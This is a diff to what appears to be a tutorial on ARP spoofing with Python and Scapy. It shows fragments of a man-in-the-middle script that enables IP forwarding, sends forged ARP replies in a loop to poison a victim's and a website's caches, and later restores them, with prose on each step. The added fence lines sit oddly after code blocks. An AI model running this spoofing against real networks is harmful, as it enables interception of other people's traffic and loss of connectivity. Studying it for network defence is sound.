@@ -38,6 +38,7 @@ def enable_ip_forwarding():
     os.system(f"iptables -t nat -A POSTROUTING -o {INTERFACE} -j MASQUERADE")
     os.system(f"iptables -A FORWARD -i {INTERFACE} -j ACCEPT")
 
+```python 
 
 echo 1:
 Enables Linux packet forwarding. Even if the packet is not destined for the attacker, the OS forwards it instead of dropping it.
@@ -57,6 +58,7 @@ def get_mac(ip):
     if ans:
         return ans[0][1].hwsrc
     return None
+```python 
 
 
 This part sends a broadcast ARP request ("Who has this IP?") to the entire network (ff:ff:ff:ff:ff:ff).
@@ -74,6 +76,7 @@ def spoof(target_ip, spoof_ip, target_mac):
     # op=2 is ARP Reply.
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, verbose=False, iface=INTERFACE)
+```python 
 
 op=2 (ARP Reply): We use Opcode 2 to forcefully update the ARP table on the target machine, even though they never sent a request.
 
@@ -95,6 +98,7 @@ try:
         spoof(WEBSITE_IP, VICTIM_IP, website_mac)
         
         time.sleep(2)
+```python 
 
 Continuous Spoofing: We enter a while True loop to continuously send packets.
 
@@ -111,6 +115,7 @@ def restore(dest_ip, source_ip, dest_mac, source_mac):
     packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, count=4, verbose=False, iface=INTERFACE)
     
+```python 
 If we simply exit, the victim will have the wrong MAC address cached and will lose internet access (DoS).
 
 This function sends the correct MAC address (hwsrc=source_mac) to the victim and router.
